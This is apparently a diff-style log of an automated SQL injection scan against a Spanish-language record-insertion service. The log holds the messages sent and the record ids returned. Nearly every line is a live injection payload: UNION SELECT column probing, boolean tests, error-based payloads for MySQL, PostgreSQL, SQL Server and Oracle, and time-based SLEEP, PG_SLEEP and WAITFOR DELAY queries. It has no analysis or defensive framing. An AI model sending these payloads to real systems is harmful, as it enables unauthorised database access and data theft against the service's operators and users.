+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  595128
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  377468
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  531166
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  609561
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, CONCAT(0x3a6d6c733a,0x4671684e4647557a694e,0x3a696a673a), NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  53236
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, CONCAT(0x3a6d6c733a,0x774e4f7a4c42566a6143,0x3a696a673a), NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  932238
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x456749744a474d476b78,0x3a696a673a), NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  852269
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x7578514755615a576675,0x3a696a673a), NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  888628
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT CONCAT(0x3a6d6c733a,0x534e6c644e6778526a61,0x3a696a673a), NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  99012
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x636b6963494648634154,0x3a696a673a), NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  396188
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x76776367795a46547266,0x3a696a673a)#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  404672
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,-9226' UNION ALL SELECT NULL, CONCAT(0x3a6d6c733a,0x5464435564756957727a,0x3a696a673a), NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  213109
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,-3882' UNION ALL SELECT CONCAT(0x3a6d6c733a,0x5661776f7643656f4a77,0x3a696a673a), NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  479230
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,-8840' UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x6778637753467a76776c,0x3a696a673a), NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  313059
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,-8037' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x4a4c4c6e49676b434555,0x3a696a673a)#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  390504
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,-3310' UNION ALL SELECT NULL, NULL, CONCAT(0x3a6d6c733a,0x786144734974534c5873,0x3a696a673a), NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  679410
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,-9639' UNION ALL SELECT NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x74787159504c6c484775,0x3a696a673a), NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  869528
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,-4499' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x477a5059437276617358,0x3a696a673a), NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  745564
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) ORDER BY 1-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  86762
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) ORDER BY 5413-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  905539
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  692391
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  211008
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  795427
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  201196
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  135859
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  315153
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  478813
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  139847
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  266511
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  687441
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951 ORDER BY 1-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  81429
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951 ORDER BY 4625-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  436984
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  803964
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  661785
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  564744
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  358833
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  745275
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  80741
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  85021
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  658756
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  466964
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  26295
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') ORDER BY 1-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  211458
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') ORDER BY 7645-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  342746
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  982297
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  270713
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  290764
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  119619
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  160957
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  217202
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  521130
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  339924
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  798068
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  863599
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' ORDER BY 1-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  376759
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' ORDER BY 5679-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  733913
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  834733
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  623352
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  172845
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  936954
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  227319
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  958612
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  719038
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  163344
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  555271
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,Ingles,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  770209
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951,6749,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  934503
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951,Ingles())(()))'',1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  743850
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 5903=7632 AND (2377=2377,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  379870
+2012-05-02 19:34:19 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 2418=2418 AND (2988=2988,1,10
+2012-05-02 19:34:19 -0500 respuesta recibida: Tu id del registro es  743205
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 6797=2069 AND (2575=2575,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  374722
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 4023=7639,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  76299
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 2418=2418,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  722250
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 3911=3461,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  691184
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 9081=2030 AND ('tXHt'='tXHt,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  543546
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 2418=2418 AND ('vULv'='vULv,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  273392
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 1671=7977 AND ('xmur'='xmur,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  325246
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 6733=5041 AND 'LIpd'='LIpd,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  992041
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 2418=2418 AND 'wymd'='wymd,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  722135
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 3414=6828 AND 'Msno'='Msno,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  694935
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND (SELECT 8239 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (8239=8239) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8693=8693,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  312615
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND (SELECT 8239 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (8239=8239) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a),1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  153240
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND (SELECT 8239 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (8239=8239) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('URpy'='URpy,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  890367
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND (SELECT 8239 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (8239=8239) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'JEle'='JEle,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  12325
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 2379=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2379=2379) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND (3481=3481,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  732725
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 2379=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2379=2379) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC),1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  629181
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 2379=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2379=2379) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND ('dSZn'='dSZn,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  602316
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 2379=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2379=2379) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND 'eLIJ'='eLIJ,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  160003
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 9838=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (9838=9838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND (5428=5428,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  951057
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 9838=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (9838=9838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))),1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  450476
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 9838=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (9838=9838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND ('NeTC'='NeTC,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  960833
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 9838=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (9838=9838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND 'oWUv'='oWUv,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  203841
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 4834=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4834=4834) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND (1255=1255,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  818846
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 4834=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4834=4834) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL),1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  529884
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 4834=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4834=4834) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND ('JURO'='JURO,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  473960
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 4834=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4834=4834) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND 'biWD'='biWD,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  876504
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles); SELECT SLEEP(5);-- ,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  424370
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles; SELECT SLEEP(5);-- ,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  739974
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles'); SELECT SLEEP(5);-- ,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  810153
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles'; SELECT SLEEP(5);-- ,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  858179
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles); SELECT PG_SLEEP(5);--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  127308
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles; SELECT PG_SLEEP(5);--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  788543
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles'); SELECT PG_SLEEP(5);--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  179803
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles'; SELECT PG_SLEEP(5);--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  260717
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles); WAITFOR DELAY '0:0:5';--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  351164
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles; WAITFOR DELAY '0:0:5';--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  830378
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles'); WAITFOR DELAY '0:0:5';--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  74229
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles'; WAITFOR DELAY '0:0:5';--,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  261390
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND SLEEP(5) AND (2055=2055,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  112093
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles AND SLEEP(5),1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  42018
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND SLEEP(5) AND ('GIvA'='GIvA,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  36521
+2012-05-02 19:34:20 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND SLEEP(5) AND 'CjZR'='CjZR,1,10
+2012-05-02 19:34:20 -0500 respuesta recibida: Tu id del registro es  920203
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 4066=(SELECT 4066 FROM PG_SLEEP(5)) AND (9816=9816,1,10
